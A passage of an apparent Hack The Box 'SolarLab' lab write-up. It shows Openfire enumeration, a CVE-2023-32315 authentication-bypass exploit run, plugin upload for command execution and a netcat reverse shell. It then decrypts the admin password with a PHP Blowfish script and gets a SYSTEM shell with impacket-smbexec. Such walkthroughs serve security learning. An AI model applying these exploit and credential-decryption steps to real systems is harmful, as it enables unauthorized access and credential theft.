+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                 <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line">d<span class="literal">-----</span>        <span class="number">11</span>/<span class="number">17</span>/<span class="number">2023</span>  <span class="number">10</span>:<span class="number">03</span> AM                Administrator</span><br><span class="line">d<span class="literal">-----</span>        <span class="number">11</span>/<span class="number">16</span>/<span class="number">2023</span>   <span class="number">9</span>:<span class="number">43</span> PM                blake</span><br><span class="line">d<span class="literal">-----</span>        <span class="number">11</span>/<span class="number">17</span>/<span class="number">2023</span>   <span class="number">2</span>:<span class="number">13</span> PM                openfire</span><br><span class="line">d<span class="literal">-r---</span>        <span class="number">11</span>/<span class="number">17</span>/<span class="number">2023</span>  <span class="number">12</span>:<span class="number">54</span> PM                Public</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Users&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>I also find an <code>Openfire</code> directory under <code>Program Files</code>:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">ls</span> <span class="string">&#x27;program files&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\program files</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                 <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line">d<span class="literal">-----</span>        <span class="number">11</span>/<span class="number">16</span>/<span class="number">2023</span>   <span class="number">9</span>:<span class="number">39</span> PM                Common Files</span><br><span class="line">d<span class="literal">-----</span>         <span class="number">4</span>/<span class="number">26</span>/<span class="number">2024</span>   <span class="number">4</span>:<span class="number">39</span> PM                Internet Explorer</span><br><span class="line">d<span class="literal">-----</span>        <span class="number">11</span>/<span class="number">17</span>/<span class="number">2023</span>  <span class="number">10</span>:<span class="number">04</span> AM                Java</span><br><span class="line">d<span class="literal">-----</span>        <span class="number">11</span>/<span class="number">16</span>/<span class="number">2023</span>   <span class="number">9</span>:<span class="number">47</span> PM                Microsoft Update Health Tools</span><br><span class="line">d<span class="literal">-----</span>         <span class="number">12</span>/<span class="number">7</span>/<span class="number">2019</span>  <span class="number">11</span>:<span class="number">14</span> AM                ModifiableWindowsApps</span><br><span class="line">d<span class="literal">-----</span>        <span class="number">11</span>/<span class="number">17</span>/<span class="number">2023</span>   <span class="number">2</span>:<span class="number">22</span> PM                Openfire</span><br><span class="line">d<span class="literal">-----</span>         <span class="number">4</span>/<span class="number">26</span>/<span class="number">2024</span>   <span class="number">2</span>:<span class="number">38</span> PM                RUXIM</span><br><span class="line">d<span class="literal">-----</span>          <span class="number">5</span>/<span class="number">3</span>/<span class="number">2024</span>   <span class="number">2</span>:<span class="number">34</span> PM                VMware</span><br><span class="line">d<span class="literal">-----</span>        <span class="number">11</span>/<span class="number">16</span>/<span class="number">2023</span>  <span class="number">11</span>:<span class="number">12</span> PM                Windows Defender</span><br><span class="line">d<span class="literal">-----</span>         <span class="number">4</span>/<span class="number">26</span>/<span class="number">2024</span>   <span class="number">4</span>:<span class="number">39</span> PM                Windows Defender Advanced Threat Protection</span><br><span class="line">d<span class="literal">-----</span>        <span class="number">11</span>/<span class="number">16</span>/<span class="number">2023</span>  <span class="number">10</span>:<span class="number">11</span> PM                Windows Mail</span><br><span class="line">d<span class="literal">-----</span>        <span class="number">11</span>/<span class="number">16</span>/<span class="number">2023</span>  <span class="number">10</span>:<span class="number">11</span> PM                Windows Media Player</span><br><span class="line">d<span class="literal">-----</span>         <span class="number">4</span>/<span class="number">26</span>/<span class="number">2024</span>   <span class="number">4</span>:<span class="number">39</span> PM                Windows Multimedia Platform</span><br><span class="line">d<span class="literal">-----</span>         <span class="number">12</span>/<span class="number">7</span>/<span class="number">2019</span>  <span class="number">11</span>:<span class="number">50</span> AM                Windows NT</span><br><span class="line">d<span class="literal">-----</span>        <span class="number">11</span>/<span class="number">16</span>/<span class="number">2023</span>  <span class="number">10</span>:<span class="number">11</span> PM                Windows Photo Viewer</span><br><span class="line">d<span class="literal">-----</span>         <span class="number">4</span>/<span class="number">26</span>/<span class="number">2024</span>   <span class="number">4</span>:<span class="number">39</span> PM                Windows Portable Devices</span><br><span class="line">d<span class="literal">-----</span>         <span class="number">12</span>/<span class="number">7</span>/<span class="number">2019</span>  <span class="number">11</span>:<span class="number">31</span> AM                Windows Security</span><br><span class="line">d<span class="literal">-----</span>         <span class="number">12</span>/<span class="number">7</span>/<span class="number">2019</span>  <span class="number">11</span>:<span class="number">31</span> AM                WindowsPowerShell</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>Looking for openfire CVEs, I stumbled upon <a class="link"   target="_blank" rel="noopener" href="https://github.com/miko550/CVE-2023-32315" >CVE-2023-32315 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> which requires openfire to be exposed on port 9090, checking our network connections we actually find the system listening on 9090:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; netstat <span class="literal">-an</span> | findstr <span class="number">9090</span></span><br><span class="line">  TCP    <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">9090</span>         <span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">0</span>              LISTENING</span><br><span class="line"><span class="built_in">PS</span> C:\&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>Let’s use chisel to forward the port and now we have access to the openfire dashboard:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/SolarLab/openfire.png"
+                      alt="Openfire"
+                ><figcaption>Openfire</figcaption></figure></p>
+<p>Running the exploit, we have a new registered user:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/hackthebox/solarlab/CVE-2023-32315]</span><br><span class="line">└─$ python3 CVE-2023-32315.py -t http://127.0.0.1:9090                </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██████╗      ██████╗ ██████╗ ██████╗  ██╗███████╗</span><br><span class="line">██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗╚════██╗     ╚════██╗╚════██╗╚════██╗███║██╔════╝</span><br><span class="line">██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝ █████╔╝█████╗█████╔╝ █████╔╝ █████╔╝╚██║███████╗</span><br><span class="line">██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝  ╚═══██╗╚════╝╚═══██╗██╔═══╝  ╚═══██╗ ██║╚════██║</span><br><span class="line">╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗██████╔╝     ██████╔╝███████╗██████╔╝ ██║███████║</span><br><span class="line"> ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝╚═════╝      ╚═════╝ ╚══════╝╚═════╝  ╚═╝╚══════╝</span><br><span class="line">                                                                                                       </span><br><span class="line">Openfire Console Authentication Bypass Vulnerability (CVE-2023-3215)</span><br><span class="line">Use at your own risk!</span><br><span class="line"></span><br><span class="line">[..] Checking target: http://127.0.0.1:9090</span><br><span class="line">Successfully retrieved JSESSIONID: node0xtbb0pwgggtmu2hykb4exn7a1.node0 + csrf: 6oUgLQ8h8QcX2S7</span><br><span class="line">User added successfully: url: http://127.0.0.1:9090 username: i0uve6 password: 8ie5eh</span><br><span class="line">                                                                                            </span><br></pre></td></tr></table></figure></div>
+
+<p>And we are in:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/SolarLab/openfire1.png"
+                      alt="Openfire"
+                ><figcaption>Openfire</figcaption></figure></p>
+<p>For the exploit to work, we just have to upload a <code>openfire-management-tool-plugin.jar</code> file that will give us a server management tool with a default password of 123:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/SolarLab/openfire2.png"
+                      alt="Openfire"
+                ><figcaption>Openfire</figcaption></figure></p>
+<p>We now head over to <code>server =&gt; server settings =&gt; Management Tool</code>, and we have command execution:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/SolarLab/openfire3.png"
+                      alt="Openfire"
+                ><figcaption>Openfire</figcaption></figure></p>
+<p>Let’s get a shell again :)</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─<span class="variable">$</span> rlwrap nc <span class="literal">-lvnp</span> <span class="number">9001</span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">9001</span> ...</span><br><span class="line">connect to <span class="function">[<span class="number">10.10</span><span class="type">.x.x</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">10.129</span><span class="type">.231.39</span>] <span class="number">50801</span></span><br><span class="line">Windows PowerShell running as user openfire on SOLARLAB</span><br><span class="line">Copyright (C) <span class="number">2015</span> Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Program Files\Openfire\bin&gt;whoami</span><br><span class="line">solarlab\openfire</span><br><span class="line"><span class="built_in">PS</span> C:\Program Files\Openfire\bin&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>Once again, looking for database credentials that might be useful, I stumbled upon a file called <code>openfire.log</code> inside of <code>embedded-db</code> folder:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Program Files\Openfire\embedded<span class="literal">-db</span>&gt; <span class="built_in">cat</span> openfire.log</span><br><span class="line">/*C2*/<span class="built_in">SET</span> SCHEMA PUBLIC</span><br><span class="line">DELETE FROM OFPROPERTY <span class="built_in">WHERE</span> NAME=<span class="string">&#x27;update.lastCheck&#x27;</span></span><br><span class="line">INSERT INTO OFPROPERTY VALUES(<span class="string">&#x27;update.lastCheck&#x27;</span>,<span class="string">&#x27;1726761418536&#x27;</span>,<span class="number">0</span>,NULL)</span><br><span class="line">COMMIT</span><br><span class="line">INSERT INTO OFUSER VALUES(<span class="string">&#x27;i0uve6&#x27;</span>,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,<span class="string">&#x27;001726769280888&#x27;</span>,<span class="string">&#x27;001726769280888&#x27;</span>)</span><br><span class="line">COMMIT</span><br><span class="line">DELETE FROM OFUSER <span class="built_in">WHERE</span> USERNAME=<span class="string">&#x27;i0uve6&#x27;</span></span><br><span class="line">INSERT INTO OFUSER VALUES(<span class="string">&#x27;i0uve6&#x27;</span>,<span class="string">&#x27;VNGmwfXwdo9wfY2nkriUkaJi8Ec=&#x27;</span>,<span class="string">&#x27;C8qYvY6k+/+jo9GBh+Xbl1dHNcc=&#x27;</span>,<span class="string">&#x27;ZMM5aglF85dyWmtxnCPLUhxWMy0ACDpi&#x27;</span>,<span class="number">4096</span>,NULL,<span class="string">&#x27;83de4c9dc7043ae63713c55a0fc58b0048a84bb5a3202174&#x27;</span>,NULL,NULL,<span class="string">&#x27;001726769280888&#x27;</span>,<span class="string">&#x27;001726769280888&#x27;</span>)</span><br><span class="line">COMMIT</span><br><span class="line">INSERT INTO OFPROPERTY VALUES(<span class="string">&#x27;admin.authorizedJIDs&#x27;</span>,<span class="string">&#x27;admin@solarlab.htb,i0uve6@solarlab.htb&#x27;</span>,<span class="number">0</span>,NULL)</span><br><span class="line">COMMIT</span><br><span class="line">DELETE FROM OFID <span class="built_in">WHERE</span> IDTYPE=<span class="number">25</span></span><br><span class="line">INSERT INTO OFID VALUES(<span class="number">25</span>,<span class="number">4</span>)</span><br><span class="line">COMMIT</span><br><span class="line">INSERT INTO OFSECURITYAUDITLOG VALUES(<span class="number">3</span>,<span class="string">&#x27;i0uve6&#x27;</span>,<span class="number">1726769313246</span>,<span class="string">&#x27;Successful admin console login attempt&#x27;</span>,<span class="string">&#x27;solarlab.htb&#x27;</span>,<span class="string">&#x27;The user logged in successfully to the admin console from address 127.0.0.1. &#x27;</span>)</span><br><span class="line">COMMIT</span><br><span class="line">DELETE FROM OFID <span class="built_in">WHERE</span> IDTYPE=<span class="number">25</span></span><br><span class="line">INSERT INTO OFID VALUES(<span class="number">25</span>,<span class="number">5</span>)</span><br><span class="line">COMMIT</span><br><span class="line">INSERT INTO OFSECURITYAUDITLOG VALUES(<span class="number">4</span>,<span class="string">&#x27;i0uve6&#x27;</span>,<span class="number">1726769468048</span>,<span class="string">&#x27;uploaded plugin &#x27;</span>,<span class="string">&#x27;solarlab.htb&#x27;</span>,NULL)</span><br><span class="line">COMMIT</span><br><span class="line">DELETE FROM OFID <span class="built_in">WHERE</span> IDTYPE=<span class="number">25</span></span><br><span class="line">INSERT INTO OFID VALUES(<span class="number">25</span>,<span class="number">6</span>)</span><br><span class="line">COMMIT</span><br><span class="line">INSERT INTO OFSECURITYAUDITLOG VALUES(<span class="number">5</span>,<span class="string">&#x27;i0uve6&#x27;</span>,<span class="number">1726769484353</span>,<span class="string">&#x27;uploaded plugin openfire-management-tool-plugin.jar&#x27;</span>,<span class="string">&#x27;solarlab.htb&#x27;</span>,NULL)</span><br><span class="line">COMMIT</span><br><span class="line"><span class="built_in">PS</span> C:\Program Files\Openfire\embedded<span class="literal">-db</span>&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>It contains a user named admin, now checking <code>openfire.script</code> we find an encrypted admin password:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO OFUSER VALUES(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;gjMoswpK+HakPdvLIvp6eLKlYh0=&#x27;</span>,<span class="string">&#x27;9MwNQcJ9bF4YeyZDdns5gvXp620=&#x27;</span>,<span class="string">&#x27;yidQk5Skw11QJWTBAloAb28lYHftqa0x&#x27;</span>,<span class="number">4096</span>,NULL,<span class="string">&#x27;becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442&#x27;</span>,<span class="string">&#x27;Administrator&#x27;</span>,<span class="string">&#x27;admin@solarlab.htb&#x27;</span>,<span class="string">&#x27;001700223740785&#x27;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>In order to be able to decrypt a openfire password, I used <a class="link"   target="_blank" rel="noopener" href="https://github.com/shakaw/openfire-password-decrypt" >this tool <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>The tool needs the blowfish key:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/SolarLab/openfire4.png"
+                      alt="Openfire"
+                ><figcaption>Openfire</figcaption></figure></p>
+<p>Which we can easily acquire from the script file:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO OFPROPERTY VALUES(<span class="string">&#x27;passwordKey&#x27;</span>,<span class="string">&#x27;hGXiFzsKaAeYLjn&#x27;</span>,<span class="number">0</span>,NULL)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>Here’s the used code:</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/hackthebox/solarlab/CVE-<span class="number">2023</span>-<span class="number">32315</span>/openfire-password-decrypt]</span><br><span class="line">└─$ cat code.php                </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt_openfirepass</span>(<span class="params"><span class="variable">$ciphertext</span>, <span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$cypher</span> = <span class="string">&#x27;bf-cbc&#x27;</span>;  <span class="comment">// Blowfish cipher in CBC mode</span></span><br><span class="line">    <span class="variable">$sha1_key</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$key</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$ivsize</span> = <span class="title function_ invoke__">openssl_cipher_iv_length</span>(<span class="variable">$cypher</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Decode the ciphertext</span></span><br><span class="line">    <span class="variable">$ciphertext_bin</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$ciphertext</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Extract IV and actual ciphertext</span></span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$ciphertext_bin</span>, <span class="number">0</span>, <span class="variable">$ivsize</span>);</span><br><span class="line">    <span class="variable">$ciphertext_bin</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$ciphertext_bin</span>, <span class="variable">$ivsize</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Perform decryption</span></span><br><span class="line">    <span class="variable">$plaintext</span> = <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$ciphertext_bin</span>, <span class="variable">$cypher</span>, <span class="variable">$sha1_key</span>, OPENSSL_RAW_DATA, <span class="variable">$iv</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$plaintext</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$key</span> = <span class="string">&#x27;hGXiFzsKaAeYLjn&#x27;</span>;</span><br><span class="line"><span class="variable">$ciphertext</span> = <span class="string">&#x27;becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$decrypted_password</span> = <span class="title function_ invoke__">decrypt_openfirepass</span>(<span class="variable">$ciphertext</span>, <span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Decrypted password: &quot;</span> . <span class="variable">$decrypted_password</span> . PHP_EOL;</span><br><span class="line">                                                                                       </span><br><span class="line">┌──(kali㉿kali)-[~/hackthebox/solarlab/CVE-<span class="number">2023</span>-<span class="number">32315</span>/openfire-password-decrypt]</span><br><span class="line">└─$ php code.php</span><br><span class="line">Decrypted password: ThisPasswordShouldDo!@</span><br><span class="line">                                                                                       </span><br><span class="line">┌──(kali㉿kali)-[~/hackthebox/solarlab/CVE-<span class="number">2023</span>-<span class="number">32315</span>/openfire-password-decrypt]</span><br><span class="line">└─$ </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>And we get our password! <code>ThisPasswordShouldDo!@</code> and our root flag:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/<span class="type">impacket</span>/<span class="type">examples</span>]</span><br><span class="line">└─<span class="variable">$</span> impacket<span class="literal">-smbexec</span> Administrator:<span class="string">&#x27;ThisPasswordShouldDo!@&#x27;</span>@solarlab.htb</span><br><span class="line">Impacket v0.<span class="number">12.0</span> - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[!] Launching semi<span class="literal">-interactive</span> shell - Careful what you execute</span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">nt authority\system</span><br><span class="line">C:\Windows\system32&gt;powershell <span class="literal">-c</span> <span class="built_in">cat</span> C:/Users/Administrator/Desktop/root.txt</span><br><span class="line">f0d67ab3469991****************</span><br><span class="line">C:\Windows\system32&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>And that was it for SolarLab :) Hope you enjoyed it &lt;3<br>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: SolarLab</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2024-09-19 16:50:01</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-09-19 20:16:41
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://foued-saidi.tech/2024/09/19/Hackthebox-SolarLab/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/09/13/Hackthebox-Intuition/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: Intuition</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: SolarLab</div>
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SMB-445"><span class="nav-text">SMB - 445</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-Application-http-report-solarlab-htb-6791"><span class="nav-text">Web Application - http:&#x2F;&#x2F;report.solarlab.htb:6791&#x2F; </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privilege-Escalation-Root"><span class="nav-text">Privilege Escalation - Root</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
